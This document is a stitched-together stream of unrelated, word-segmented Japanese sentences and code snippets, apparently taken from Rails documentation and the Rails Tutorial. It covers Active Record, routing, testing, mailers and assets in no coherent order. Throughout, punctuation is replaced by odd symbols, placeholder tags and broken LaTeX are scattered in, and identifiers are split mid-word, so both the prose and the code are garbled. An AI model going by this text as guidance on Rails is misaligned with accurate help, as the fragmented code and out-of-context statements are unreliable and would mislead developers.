` foreign_key ` メソッド は 、 クラス 名 から 外部 キー カラム 名 を 求め る 時 に 使用 し ま す 。
>>   Person ▖ create !
` ActiveRecord : : Base ` に は 、 ` lock_ version ` カラム 名 を 上書き する ため の ` locking_ column ` が 用意 さ れ て い ま す 。
= > #< Word : 0 x 22 d 0 b 20>
多 対 多 の リレーションシップ を 宣言 する もう 1 つ の 方法 は ` has_many : through ` で す 。
これ は リスト \ ref{ code : signup_ route } で 使用 さ れ て い ま し た 。
以下 の リスト で それぞれ の 役割 を 説明 し ま す 。
if  options [ : u sage ]
    mattr_accessor   :load _once_ paths
開発 者 で あ れ ば 誰 も が 通 る 道 で す 。
この 場合 、 以下 の よう な コード を 実行 する 必要 が あ る で しょ う 。
まず は 、 有効 な メール アドレス を リスト \ ref{ code :email _ format_valid_tests } に 示 し ま す 。
app/assets/stylesheets
何 か 問題 が 生 じ た 場合 は 、 以下 を 実行 し て
これ で 、 アプリケーション 自体 を 作成 する ため の 下 準備 が 整 い ま し た 。
> , ▖▖▖}
これ より 、 複数 の 静的 な ページ を 取り扱 う StaticPages コントローラ を 作成 し ま す 。
この メソッド が 受け取れ る 引数 は 、 リンク の 種類   ( `:rss ` また は ` : atom` ) 、 url_ for で 渡 さ れ る オプション の ハッシュ 、 および タグ の ハッシュ で す 。
` years_ago ` メソッド は 、 年数 を 受け取 り 、 その 年数 前 の 同じ 日付 を 返 し ま す 。
#  Use  sqlite 3   as  the  database   for   Active   Record
fixture ファイル 内 で 埋め込 み Ruby を 使 う と 、 多量 の テスト ユーザー を 作成 する こと が でき る
上 の 実行 結果 で は 、 実際 の テスト は 1 / 10 秒 以下 で 実行 さ れ ま す が 、 テスト スイート は 7 秒 以上 かか っ て い ま す 。
      #  部分 的 な 変更 を 行な う
( \ href { http://en ▖wikipedia ▖org/wiki / Extreme_ Programming } { エクストリーム ・ プログラミング   ( Extreme  Programming ) }   と い う 開発 手法 で は 、 この 模索 段階 を \emph { スパイク   (spike )   } と 呼 ん で い ま す ) 。
テスト スイート は 期待 どおり パス   GREEN { 0 } { 1 } { / 1 } { 1 } { 2 } { / 2 } { / 1 } { 1 } { / 1 } { / 0 }  し ま す
この メソッド は 単なる 目印 で あ り 、 メソッド の 本体 と 戻 り 値 の 間 に は 関連 は あ り ま せ ん 。
\ kode { footer } を \ kode {div } に 置き換え て も 動作 は 変わ り ま せ ん 。
その 際 、 CDN の " origin " 設定 を Rails アプリケーション の Web サイト ` example ▖ com ` に する 必要 も あ り ま す ▟ origin サーバー の 設定 方法 の ドキュメント に つ い て は プロバイダー に お 問い合わせ くださ い 。
Sessions コントローラ の \ kode { create } アクション   ( 暫定 版 )
( この 点 を 深 く 理解 し た い 方 に は 、 「 \emph { The   Rails   4   Way } 」 ( Obie   Fernandez 著 )   が お 勧め で す )   。
####   複数 の 関連 付け を 結合 する
これ を 解決 する の が \emph { ページ ネーション   ( pagination )   } と い う もの で 、 この 場合 は 、 たとえば 1 つ の ページ に 一 度 に 30 人 だけ ユーザー を 表示 する と い う もの で す 。
配列   ( array )   は 、 特定 の 順序 を 持 つ 要素 の リスト で す 。
#   lib/blorgh/engine ▖ rb
ここ に は アプリケーション 、 エンジン 、 Rails フレームワーク を 含 む あらゆる 登録 済み 名前 空間 が 含 ま れ ま す 。
\ href { http://local host : 3000 / signup}{/ signup } で 表示 さ れ る 新し い ユーザー 登録 ページ
\ kode {assert\_select } に は 色々 な 指定 の 仕方 が あ り ま す ▟ その 代表 例 を いく つ か 表 \ ref{table : assert_select } で 紹介 し ま す 。
Limit と Offset
削除 さ れ た ディレクトリ と ファイル を 無事 復旧 d ま し た 。
\ ref{ sec : remember_me } で は 、 ブラウザ を 閉じ て も 保持 さ れ る セッション を 追加 し ま す 。
              DELETE  /articles/: id ( ▖: format )        articles # destroy
*   関連 付け の スコープ 制御
#  template ▖ rb
この メソッド は 、 任意 の 数 の アクション 名 を 引数 に 取 る こと が でき 、 引数 の 末尾 項目 で オプション ハッシュ を 使用 でき ま す 。
###  Action   Mailer の レイアウト
\ href { http://www ▖railstutorial ▖org / screencasts}{\emph { Ruby   on   Rails チュートリアル } スクリーン キャスト } ▟ 本書 に 合わせ て 、 完全 版 の スクリーン キャスト を 用意 し て あ り ま す 。
|` raise_ delivery _errors` | メール 配信 に 失敗 し た 場合 に エラー を 発生 する か どう か を 指定 し ま す 。
<%=   form _ for  @ person ,  url:  { action :  " update " }   do  | person _form | %>
変更 前 の 以下 の コード は 、 より 明示 的 で し た 。
Client ▖ w here (orders_count :   [ 1 , 3,5 ] )
*   [ jquery -ujs に 関 する 外部 記事 の リスト ] (https://github▖ com/rails/jquery -ujs/wiki / External - articles )
     do _something _ returning _a_string ( string )
メール フォーマット を 正規 表現 で 検証 する   (  \ passing   { 5 } { / 5 }   { 6 } app/models/user▖ rb { / 6 } )
たとえば 、 メール アドレス や パスワード で 、 確認 フィールド を 使用 する と し ま す 。
scaffold で 生成 し た 実際 の コード に は { 0 } { 1 } リスト 2 ▖ 8 { / 1 } { / 0 } より も 多く の 改行 が 追加 さ れ て い る こと が あ り ま す 。
Client ▖ w here ( locked:  true )
  *   名前 空間 化 さ れ た ` Application Controller ` スタブ
Active   Record の オブジェクト に は 2 種類 あ り ま す ▟ オブジェクト が データベース の 行 ( row ) に 対応 し て い る もの と 、 そう で な い もの で す 。
$ bun dle   exec   rake   test ╼ 3   tests ,   3   assertions ,   0   failures ,   0   errors ,   0   skips
同様 に 、 ` cattr_*` に ブロック を 渡 し て 属性 に デフォルト 値 を 設定 する こと も でき ま す 。
( この アド オン を 使用 する に は Heroku アカウント に クレジット カード を 設定 する 必要 が あ り ま す が 、 アカウント 検証 で は 料金 は 発生 し ま せ ん ) 。
\ kode { Word } クラス は \ kode { String } クラス を 継承 し て い る の で 、 コンソール を 使用 し て クラス 階層 を 明示 的 に 確認 でき ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : account_activation_preview } に 示 し ま す 。
この コード は リスト \ ref{ code : new_user_ with _ partial } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
上 の コード で は 、 `_product ` パーシャル と `_ product ` パーシャル の 合間 に ` _ product_ruler ` パーシャル   ( 引数 なし )   を レンダリング し ま す 。
` app/assets/images ` に 置 か れ て い る 画像 アセット へ の パス を 算出 し ま す 。
これ は リスト \ ref{ code : development_email_settings } で 使用 さ れ て い ま し た 。
RJS   の 設定 ` config▖ action_view▖debug _rjs =  true ` を 削除 し て くださ い 。
\emph { 応用 問題 } : /users と / users/: id 両方 の 統合 テスト を 作成 し て くださ い 。
実際 に は この ガイド で は ` - - mountable ` オプション を 使用 し ま す ▟ これ は `- - full ` の オプション 以外 に も いく つ か の 機能 を 追加 し て くれ ま す 。
もう 少し 何 と か し て み ま しょ う 。
Show   action   for   articles ] ( images/getting _ started/show _ action _for_ articles ▖ png )
ブラウザ と の やりとり を 増や さ な い よう に 工夫 し た 例 を 以下 に 示 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :micropost _accessible_attribute } に 示 し ま す 。
ユーザー が 画像 を 置け な い
Article ▖ recent ▖ many?
もちろん 、 テスティング の フレームワーク が 純粋 な Ruby で な い と い う 点 は 残念 で も あ り 、 著者 に と っ て は テキスト ベース の ストーリー は いささか 冗長 な 面 も あ る と 思 わ れ ま す 。
{ 0 } 図 7 ▖ 1 { / 0 }   { 1 } この 節 で 作成 する ユーザー プロファイル の モックアップ { / 1 }
    @product   =   Product ▖find ( params [ : id ] )
たとえば 、 フィーチャー ファイル に あ る 以下 の コード は 、
著作 権 と ライセンス
今度 は CDN の コピー で す 。
この 機能 を サンプル アプリケーション に 実装 し て み ま しょ う 。
*   Rails   4 ▖ 0 で は ` link_to ` ヘルパー で の ` : confirm ` オプション が 非 推奨 に な り ま し た 。
delegate  : logger ,   to : : Rails
リスト \ ref{ code :microposts_ home_ page } の コード を 動か す ため に は 、 いく つ か の Partial を 作 る 必要 が あ り ま す 。
       create    app/views/users
図 \ ref { fig : page _ flow _ home_ page _feed_mockup } でお 見せ し た ステータス フィード の 最終 形 を 図 \ ref { fig : home_ page _feed_mockup } に 再度 掲載 し ま す 。
#     < id > 44 04 < / id >
#      #{@ comment▖ text }
# => [ " David " ,   " Jeremy " ,   " Jose " ]
  >>   1 ▖ kilobyte╼  = >   10 24 ╼   >>   5 ▖ megabytes╼  = >  52 4 288 0
ハッシュ の 生成 法 に つ い て は 、 本 ガイド の [ production 環境 の 場合 ] ( # production 環境 の 場合 ) で 後述 し ま す 。
person ▖errors▖ full _messages
# => {nil = > nil ,   1 = > 1 ,   nested :{ a : 3 ,   5 = > 5 } }
  #  RFC に よ る と キャッシュ は 最長 1 年 まで
    ```yaml
       example ▖ com へ の サイン アップ が 成功 し ま し た 。
ユーザー 登録 フォーム を 完成 さ せ る ため に 、 リスト \ ref{ code : create_action_strong _ parameters } の コメント アウト さ れ た 部分 に コード を 書 き 、 適切 に 動作 する よう に し ま しょ う 。
### `: message`
$   ls   - l
この ヘッダー は 、 サーバー と クライアント ブラウザ の 間 に あ る すべて の キャッシュ   ( プロキシ など )   に 対 し て 、 サーバー が 提供 する この コンテンツ は 1 年間 キャッシュ し て よ い と 通知 し ま す 。
エンジン で 使用 する クラス で 必須 と な る メソッド は ` find_or_create_by ` のみ で す ▟ この メソッド は その クラス の オブジェクト を 1 つ 返 し ま す 。
    @@field_error _proc  =   Proc▖ new{ ▖▖▖ }
User ▖ active
` size ` メソッド は 、 その オブジェクト の エラー メッセージ の 総数 を 返 し ま す 。
Via :   1 ▖ 1   varnish
*   データベース の マイ グレーション 、 検証 ( validation ) 、 コール バック
最後 に 、 第 \ ref { cha : account_activation_and _ password _ reset } 章 で メール アドレス を 使 っ て アカウント を 有効 化 する 方法 と 、 パスワード を リセット する 方法 に つ い て 学 び ま す 。
###  関連 付け の 一括 読み込み で 条件 を 指定 する
<% = stylesheet_link_tag   "main_print " ,   media :   " print "  %>
以下 は テーブル を 作成 する マイグレーション で す 。
これ を 行な う に は 、 最初 に 以下 の コマンド を 実行 し て マイグレーション を エンジン から コピー する 必要 が あ り ま す 。
    has_many : sections
` has_many : through ` 関連 付け は 、 他方 の モデル と 「 多 対 多 」 の つながり を 設定 する 場合 に よく 使 わ れ ま す 。
if @order ▖ customer▖nil ?
この 節 で は 、 リスト \ ref{ code : password _ reset_update_action } の 2 つ   ( また は 3 つ )   の 分岐 、 つまり 送信 に 成功 し た 場合 と 失敗 し た 場合 の 統合 テスト を 作成 し ま す
ネスティング レベル に は 制限 が な い 点 に ご 注目 くださ い 。
#     < author > Joshua   Peek</author >
class   CreateAppointments <  ActiveRecord : : Migration
今回 の 実装 は 、 リスト \ ref{ code : login_form } の ログ インフォーム に チェック ボックス を 追加 する ところ から 始め ま す 。
処理 前 の ソース は ` data ` に 保存 さ れ ま す 。
*  `collection ▖find ( ▖▖▖)
=>   " 2   women "
エンジン は ホスト アプリケーション と 混じ ら な い よう 分離 し て お く こと も でき ま す 。
   def  self ▖#{ method_ id } (*args)
*   アセット パイプライン の 概要 と 機能
t ▖ advance ( seconds :   1 )
( これ ら の アクション は \ ref{ sec :a_working _ follow_button_the_standard _way } で 実装 し ま す ) 。
Date▖ new (2010 ,   5 ,   24 ) ▖ weeks_ago ( 1 )      # =>  Mon ,   17   May  2010
テーブル に 含 ま れ る フィールド の 最小 値 を 得 る に は 、 その テーブル を 持 つ クラス に 対 し て ` minimum ` メソッド を 呼び出 し ま す 。
<%  benchmark  " Process  data files "   do  %>
この 節 で 作成 する プロファイル は 、 この アプリケーション に おけ る 初めて の 真 に 動的 な ページ に な り ま す 。
システム を 特定 の バージョン に 固定 し て お け ば 、 今後 RubyGems が 変更 さ れ た とき の コンフリクト を 防止 でき ま す 。
( 複数 行 の
しかし 、 通常 の ページ 読み込 み プロセス は Turbolinks に よ っ て 上書き さ れ て しま う ため 、 ページ 読み込み に 依存 する イベント は トリガ さ れ ま せ ん 。
   validates : terms _of_service ,   acceptance :  true
class   Application Controller <  Action Controller : : Base
注釈 付き の \ kode {title\_helper} ▖
create     test/mailers/user_mailer_test ▖ rb
リスト \ ref{ code : users _fixtures _extra_users } の fixture ファイル が でき た の で 、 index ページ に 対 する テスト を 書 い て み ま す 。
    adapter :  jdbcsqlite 3
  $  kill   - 15   122 4 1
|   PATCH / PUT  | / comments/: id ( ▖: format )                 |  comments # update   | sekret_comment_ path      |
< script   src= "/assets/application ▖js" ></ script > 
  $( " a [ data- background - color ] " ) ▖ click   ( e )   ->
  #< Client   id :   220 ,   first _ name :  " Sara " > ,
@customer  = @order ▖ create_customer ( customer_number :   123 ,
以下 の ルーティング を 例 に と っ て み ま しょ う 。
number_to_ currency ( 12345678 90 ▖ 50 )   # =>  $ 1 , 23 4 ,5 6 7,890 ▖ 50
   <option   value = " 12 " > India < /option >
上 の コード を もっと 短 く する の で あ れ ば 、 属性 名 と 、 設定 し た い 値 を マッピング する ハッシュ を 使用 し て 次 の よう に 書 き ま す 。
#### ` first `
Capybara の 文法 は 以下 の よう な 感じ で す 。
アクセス 可能 な 属性
foreign_key  =  options [ : foreign_key]  ||  reflection ▖ active_ record ▖ name ▖ foreign_key
Contributor ▖ limit ( 2 ) ▖ order (:rank) ▖ to _xml
Updating   34 f 06 b 7 ▖ ▖ 2 c 92 bef
* `:even ` - true に 設定 さ れ て い る 場合 は 、 偶数 で な けれ ば な り ま せ ん 。
そこ で 、 まず は ユーザー 用 fixture ファイル を 修正 し 、 今 い る サンプル ユーザー の 一人 を 管理 者 に し て み ま す   ( リスト \ ref{ code : fixture_user_ admin } ) 。
例 と し て 、 ブラック リスト に 記載 さ れ て い る すべて の ユーザー を ` Blacklist Controller ` に ルーティング し た い と し ま す 。
te}╼╼      %  subsection  a_controller_ class   ( end ) ╼╼╼    \ subsection { ユーザー クラス } %  ( fold) ╼    \ label{ sec :a_user_ class}╼╼
つまり 、 以下 を 使用 する 機能 テスト と 結合 テスト は
{ 0 } 図 12 ▖ 10 { / 0 }   { 1 } 統計 情報 パーシャル の モックアップ { / 1 }
  <strong > Text : </strong >
この 結果 は Home ページ の フィード と し て 表示 さ れ ま す   ( 図 \ ref { fig : home_with _proto _feed } ) 。
config▖ log _ level  = : info
` classify ` メソッド は 、 `tableize ` と 逆 の 動作 で す 。
ビュー の パス
マイクロ ポストリソース の ルーティング
もし \ ref{ sec : image_upload _ in_production } を スキップ し て い た ら 、 ここ で 今 まで の 変更 の コミット と merge を 済ま せ て くださ い 。
本 ガイド で 説明 の ため に 作成 する エンジン に  " blorgh "  ( blog の もじり )   と い う 名前 を 付け ま す 。
たとえば 、 写真 ( picture ) モデル が あ り 、 この モデル を 従業 員 ( employee ) モデル と 製品 ( product ) モデル の 両方 に 従属 さ せ た い と し ま す 。
header パーシャル に リンク を 追加 する
*   SQLite 3 :   [ EXPLAIN  QUERY   PLAN ] ( http://www ▖sqlite ▖org/ eqp▖html )
しかし 、 上 の 記法 は Rails 流 で は あ り ま せ ん 。
` value ` が `nil ` の 場合 、 " nil " 属性 が " true " に 設定 さ れ た もの が 追加 さ れ ま す 。
\ kode {edit } アクション と \ kode {update } アクション の セキュリティ 制限 は まったく 同じ な の で 、 これ ら を 共通 の RSpec  \ kode { describe } ブロック で 扱 う こと に し ま す 。
まず は 、 いつ も の よう に 統合 テスト を 生成 し ま す 。
以上 で 、 コントローラ と アクション と ビュー の 作成 方法 を 説明 いた し ま し た ▟ ここ から は もう 少し ブログ らし い 体裁 を 整え て い き ま しょ う 。
now ▖ change ( hour :   0 )
Client ▖ average ( " orders_count " )
Ruby に は 、 2 つ の ハッシュ を マージ する ビルト イン の ` Hash # merge ` メソッド が あ り ま す 。
ここ に 記述 さ れ て い る の は ナマ の SQL な の で 、 \ kode { followed_user_ ids } は エスケープ で は な く \emph { 内挿   ( interpolate )  } さ れ る こと に 注意 し て くださ い
` require ` および 類似 の ディレクティブ は 、 出力 時 に 同じ ファイル を 2 回 以上 インク ルード し な い よう に な っ て い ま す 。
これ ら の 属性 の 効用 に つ い て は 次 の 2 つ の 節 で 説明 し ま す 。
ブラウザ で ` doc/guides/index▖html ` を 開 く こと で ガイド を 参照 でき ま す 。
この よう な 場合 に は 、 単数 形 リソース   ( singular   resource )   を 使用 し て ` show ` アクション に   (`/profile/: id ` で は な く )  `/profile ` を 割り当て る こと が でき ま す 。
セキュリティ 上 の issue を レポート する 方法 に つ い て は 次 の セクション で 説明 し ま す 。
オーナー オブジェクト が destroy さ れ た とき に 、 オーナー に 関連 付け られ た オブジェクト を どう する か を 制御 し ま す 。
これ に よ り 、 ルート に アクセス する と Application コントローラ 内 の \ kode {hello } アクション に ルーティング さ れ る よう に な っ た の で し た 。
今後 は 、 この ` data- * ` 属性 を リンク タグ に 追加 する だけ で この 動作 を 簡単 に 追加 でき ま す 。
ルート ルーティング を 設定 する ▟ { 2 } { / 2 } { 3 } config/ routes▖rb { / 3 }
( 最後 の 行 の よう に \ kode {exit } を 実行 する と rails  console を 終了 でき ま す 。
こう し て リレーションシップ を 作成 し て お け ば 、 アプリケーション の インターフェイス を 開発 する に は 十分 で す 。
Rails で は データ の バリデーション   ( validation )   が サポート さ れ て お り 、 データ モデル の 属性 の 値 に 制限 を かけ る こと が でき る 。
*   `update_ columns `
d   =  DateTime▖ new (2010 ,   2 ,   28 ,   23 ,   59 ,   59 )
本書 は ソフトウェア 開発 者 や 、 ソフトウェア 開発 者 に な り た い 方々 の ため に 執筆 さ れ て い ま す ▟ ╼
これ は リスト \ ref{ code : first _create_action } で 使用 さ れ て い ま し た 。
「 hello 」 アプリ 「 toy 」 アプリ 「 sample 」 アプリ に は 同じ ファイル 名 が 多数 あ る ため 、 これ ら の アプリ を 同じ プロジェクト に 置 く と ファイル を 見つけ にく く な る こと が あ り ま す 。
この 例 の 場合 、 `@ parts▖ assemblies▖ create ` また は `@ parts▖ assemblies▖build ` を 実行 する と 、 ` factory ` カラム の 値 が ` Seattle ` の 注文 ( order ) が 常 に 作成 さ れ ま す 。
Bitbucket へ の リポジトリ 追加 と リポジトリ へ の プッシュ 。
あるいは 、 フィッシング サイト から ブラウザ の セキュリティ ホール を 経由 し て 邪悪 な ソフトウェア を 注入 する こと も でき ま す 。
    <%=  f ▖ label :title %><br>
ここ で は 特に 、 \ kode {activate } メソッド を 作成 し て ユーザー の 有効 化 属性 を 更新 し 、 \ kode {send\_activation\_email } メソッド を 作成 し て 有効 化 メール を 送信 し ま す 。
test モード で は デフォルト で ` false ` に 設定 さ れ 、 それ 以外 で は ` true ` に 設定 さ れ ま す 。
config▖ action _mailer ▖ smtp_settings = {
ただし 、 現 時点 で この URL を 使用 し て も エラー に な り ま す   ( 図 \ ref { fig : profile_routing _error } ) 。
build_account
EXPLAIN   for :   SELECT   " users " ▖
同じ 要領 で 、 public ディレクトリ の レスキュー ファイル   ( いわゆる エラー ページ )   も ローカライズ でき ま す 。
Rails が 解釈 する REST に は 、 標準 的 な URL セット と 、 データ モデル と やりとり する ため の コントローラ アクション が 含 ま れ て い る 。
今回 は \ kode {assert\_difference } と い う メソッド を 使 っ て テスト を 書 き ま す 。
   class   Application  <  Rails : : Application
ユーザー 登録 ページ を 動か す こと が でき た の で 、 この アプリケーション を デプロイ し て 、 本番 環境 で も 動かせ る よう に し て み ま しょ う 。
#### hidden_field
( \ ref{ sec : hashes_and_symbols } で 、 シンボル に ハイフン が 使え な かっ た こと を 思い出 し て くださ い )
ここ で の タスク 定義 は 、 Rails 全体 の コンポーネント に 対 し て 定義 さ れ ま す 。
Rails で は デフォルト で アセット パイプライン が 有効 に な っ て い ま す 。
これ で ` Template ` クラス が でき ま し た の で 、 続 い て テンプレート ファイル の 拡張 子 と の 関連 付け を 行 い ま す 。
Rails アプリケーション の バージョン が 3 ▖ 2 より 前 の 場合 、 まず 3 ▖ 2 へ の アップグレード を 完了 し て から Rails   4 ▖ 0 へ の アップグレード を 開始 し て くださ い 。
Github へ の issue 送信 、 コメント 、 プルリクエスト の 作成 を 行 う に は 、 まず GitHub アカウント   ( 無料 )   を 作成 する 必要 が あ り ま す 。
HTTP / 1 ▖ 1   30 2   Found   [ 最初 は 通常 の 302 レスポンス ]
      remove_ method ( method_ name )
` config▖ mid dleware ▖ swap ` を 使用 する こと で 、 ミドルウェアスタック 内 の ミドルウェア を 交換 でき ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : add_micropost_different_owner } に 示 し ま す 。
Active   Record に つ い て
    I 18n ▖ locale  =  : expert if  current_user ▖ expert ?
invoke     assets
文字 列 は デフォルト で は  _unsafe_  と マーク さ れ ま す 。
たとえば 、 Rails アプリケーション に 以下 の モデル が あ る と し ま す 。
` locals : {}` オプション を 使用 する こと で 、 レンダリング 中 の どの パーシャル に も 任意 の 名前 の ローカル 変数 を 渡 す こと が でき ま す 。
` : location ` を 使用 する こと で 、 HTTP の ` Location ` ヘッダー を 設定 でき ま す 。
<% =  ren der @ customer  %>
development :
たとえば 、 \ kode { name } は 空 で あ っ て は な ら ず 、 \ kode {email } は メール アドレス の フォーマット に 従 う 必要 が あ り ま す 。
Faker   gem の \emph {lorem  ipsum } サンプル テキスト は ランダム に 生成 さ れ る 仕様 に な っ て い る ため 、 サンプル マイクロ ポスト の 内容 は この 図 と 違 っ て い る はず で す 。
### `ordinalize`
前述 し た よう に 、 ` Gemfile ` に 記述 し た gem は Rails の 読み込 み 時 に 読み込 ま れ ま す 。
この 節 で は 、 Sass が 提供 する 2 つ の 重要 な 機能 、 \emph { ネスト } と \emph { 変数 } に つ い て 説明 し ま す 。
Application コントローラ に \ kode {hello } を 追加 する ▟ { 3 } { / 3 } { 4 } app/controllers/application_controller▖ rb { / 4 }
メイラー の テスト 方法 の 詳細 に つ い て は テスティング ガイド の [ メイラー を テスト する ] ( test ing ▖ html # メイラー を テスト する ) を 参照 し て くださ い 。
上 の 例 の 場合 、 以下 の よう に ルーティング を 宣言 する こと が でき ま す 。
= > [ " n " ,   " a " ,   " m " ,   " e " ]
self を 省略 し た 結果 を リスト \ ref{ code :micropost_dependency } に 示 し ま す 。
この 場合 、 テンプレート を ` app/views/articles/new▖html ▖erb ` に 置 く の が 最も シンプル で す 。
#### url_field
*  `config/application ▖rb `
これ より コメント の 部分 に 適切 な コード を 追加 し ま す 。
NOTE :   イニシャライザ を 置 く ディレクトリ に サブ フォルダ を 作 っ て イニシャライザ を 整理 する こと も でき ま す ▟ Rails は イニシャライザ 用 の ディレクトリ の 下 の すべて の 階層 を 探 し て 実行 し て くれ ま す 。
$  rails   generate
now  =  DateTime▖ current
get  ': controller/: action/:id/with _user/:user_ id '
   def  expiration_date_cannot_be_in_the_ past
これ ら の 要素 を 1 つ に まとめ る と 、 リスト \ ref{ code :micropost _validity_ test } の よう な テスト コード に な り ま す 。
この テスト で は 、 ユーザー 登録 ボタン を 押 し た とき に   ( ユーザー 情報 が 無効 で あ る ため に )   ユーザー が \emph { 作成 さ れ な い } こと を 確認 し ま す 。
まず 初め に \ kode {first } メソッド で す 。
< h 1 > Listing   Articles </ h 1 >
削除 機能 を テスト する に は 、 管理 者 を 作成 する ファクトリー が あ る と 便利 で す 。
Ruby   on   Rails   3 ▖ 2   チュートリアル
Active   Record を 使用 し て い れ ば 、 利用 し て い る データベース システム の 種類 に かかわ ら ず 、 同じ 表記 を 使用 でき ま す 。
Web アプリケーション に は 動的 な 部品 が たくさん あ る の で 、 熟練 し た 技術 を 身 に 付け る に は 十分 で す 。
ここ で ご 注目 いただ き た い の は 、 マイグレーション は 通常 の ` create_articles ` で は な く ` create_blorgh_ articles ` と い う 名前 で 呼 ば れ る と い う 点 で す 。
Ruby は 組み込 み クラス を 含 む { 0 } あらゆる { / 0 } クラス に メソッド を 追加 でき る こと を { p 1 } で 学 び ま し た 。
これ と 対 に な る \ kode { after(:all ) } を 使用 し て 、 完了 後 ユーザー を すべて 削除 し ま す 。
本書 で 学 ん だ すべて を 駆使 する こと で 、 フォロー し て い る ユーザー の マイクロ ポスト 一覧 を ステータス フィード に 表示 さ せ る こと が でき た
作成 し た コード を リスト \ ref{ code : destroy_ session } に 示 し ま す
method ▖
この 注釈 の 意味 が よく わか ら な い 場合 は 、 無視 し て も 構 い ま せ ん 。
   belongs_to  : account
Action   Mailer   の 基礎
\ label{ fig :user_ index_ mockup}}╼\end { figure} ╼╼╼    \ subsection { ユーザー インデックス } %  ( fold) ╼    \ label{ sec : users _ index} ╼╼
ちなみ に 、 \ kode { log } コマンド で コミット メッセージ の 履歴 を 参照 でき ま す 。
X - Served -By:   cache - dfw 182 8 - DFW
上 の コード に よ っ て 以下 の HTML が 生成 さ れ ま す 。
\ texttt { let } の 引数 は シンボル で あ り 、 さらに ブロック を 引数 に 取 り ま す ▟ その ブロック は 、 この シンボル 名 を 持 つ ローカル 変数 に 値 を 返 し ま す 。
    store
SSH 公開 鍵 を 追加 する 。
Finished in   0 ▖ 0 1999   second s
リスト { p 0 } の { 2 } Gemfile { / 2 } を 、 実際 に 使用 する 正確 な バージョン の gem に 置き換え た もの を リスト \ ref{ code : gemfile_sqlite_ version } に 示 し ま す 。
この 例 で は 、 ` in_groups ` メソッド は 一部 の グループ の 後ろ を 必要 に 応 じ て ` nil ` 要素 で 埋め て い る の が わか り ま す 。
シンボル は 文字 列 と 似 て い ま す が 、 クォート で 囲 む 代わり に コロン が 前 に 置 か れ て い る 点 が 異な り ま す 。
\ ref{ sec : the_relationship_model } で は やや 複雑 な データ モデリング の 技術 を 説明 し ま し た ▟ 理解 する の に 時間 が かか っ て しま っ て も 大丈夫 な の で 、 安心 し て くださ い 。
mail _ in_production   ( end ) ╼╼%  section   password _ reset   ( end ) ╼╼\ section { 最後 に } %  ( fold) ╼\ label{ sec : resets_conclusion}╼╼
ブラウザ で < http://local host : 3000/articles/new > を 開 く と 、 今 は ルーティング エラー が 表示 さ れ ま す 。
*  `asset - path ( " rails ▖ png " ) ` は `"/assets/rails ▖ png " ` に 変換 さ れ る
####  レイアウト の 探索 順序
╼/▖bun dle╼╼#  Ignore  the  default   SQLite  database ▖
Math▖ cos ( 0 ) ▖ to_ i ▖object _ id   # = >   3
scaffold で 作成 し た Users リソース は 、 Rails の 概要 を 手っ取り 早 く 説明 する に は 良 い の で す が 、 以下 の よう な さまざま な 問題 点 を 抱え て い ま す 。
今回 は \ kode {flash } 内 に 存在 する キー が あ る か を 調べ 、 もし あ れ ば その 値   ( メッセージ )   を 全て 表示 する よう に 、 レイアウト を 修正 し ま す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
ここ で コミット に つ い て 少し 解説 し て お き ま す ▟ Git に おけ る コミット は 、 あくまで \emph { ローカル } マシン 上 で の 操作 で あ る こと に 注意 し て くださ い 。
####   名前 付き 日付 時刻
コメント の 英語 は 大 文字 で 始め る こと 。
╼╼    \ subsection { 読み物 ガイド } %  ( fold) ╼    \ label{ sec : guide_to_further_ resources }╼╼
上 の コード に よ っ て 以下 が 生成 さ れ ま す 。
( \ ref{ sec : sample_app_setup } で Application コントローラ に \ kode {hello } アクション を 追加 し た 場合 は 、 今 の うち に アクション を 削除 し て お く こと を お すすめ し ま す ) 。
*   Action   Mailer クラス の テスト 方法
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/array/prepend_and_append ▖ rb ` で す 。
何 で も よ い
コード が 重複 し な い よう 、 この とき Users コントローラ から も \ kode { logged_ in_user } を 削除 し て お き ま しょ う 。
\ kode { log\ _out } メソッド
▖ secret
永続 的 セッション の テスト
   validates : name , : login ,  :email ,   presence :  true
{ 0 } 図 6 ▖ 4 { / 0 } { 1 } 素晴らし い 正規 表現 エディタ \ href { http://www ▖rubular▖ com/}{ Rubular} ▟\ href { http://railstutorial ▖org / images/figures/rubular - full ▖ png } { ( 拡大 ) } { / 1 }
他方 、 ` advance ` と ` change ` も 定義 さ れ て い ま す が これ ら は さらに 多く の オプション を サポート し て い ま す ▟ これ ら に つ い て は 後述 し ま す 。
( Rails が 属性 の 存在 性 を 検査 する とき に 、 エラー メッセージ は ヒント に な り ま す ▟ これ に は \ kode {blank ? }
また 、 ここ で は   “ followers ”   と い う 語 は \emph { ラベル } と し て 使用 し て い る の で 、 フォロワー が 1人 の 場合 に も 複数 形 の まま と し ま す 。
       create       test/models/user_test ▖ rb
つまり 「 `{ : a => : b }` 」 より も 「 `{  a : : b }` 」 が 望まし い 。
CHANGELOG は すべて の リリース で 重要 な 位置 を 占め ま す 。
micropost ▖user
プロフィール 用 リンク が 表示 さ れ て い る こと を 確認 する
Active   Job に は 、 Sidekiq 、 Resque 、 Delayed   Job など さまざま な キューイング バック エンド に 接続 でき る アダプタ が ビルト イン で 用意 さ れ て い ま す 。
<% =  ren der   " shared /footer "  %>
また 、 エラー メッセージ に \ kode { " Invalid " } と い う 単語 が 含 ま れ て い る こと も テスト し ま す 。
` pluck ` を 使用 する と 、 以下 の よう な コード を シンプル な もの に 置き換え る こと が でき ま す 。
よく 使用 さ れ る ヘッダー の リスト を 以下 に 示 し ま す 。
╼╼    %  subsection   the_first _ signup   ( end ) ╼╼\ subsection { 成功 時 の テスト } %  ( fold) ╼\ label{ sec :a_test _ for_ valid _ submis sion}╼╼
1 番 目 の 方法 は 次 の とおり で す 。
{ 0 } 図 9 ▖ 9 { / 0 }   { 1 } ユーザー 一覧 ページ に ユーザー が 1人 しか 表示 さ れ て い な い { / 1 }
use   Rails : : Rack : : Logger
{ 0 } リスト 2 ▖ 3 { / 0 } ╼╼ { 1 } ルート から users へ の ルーティング を 追加 する { 2 } { / 2 }   { 3 } config/ routes▖rb { / 3} { / 1 }
プリ プロセッサ エンジン は つなげ て 実行 する   ( chain)   こと が でき ま す 。
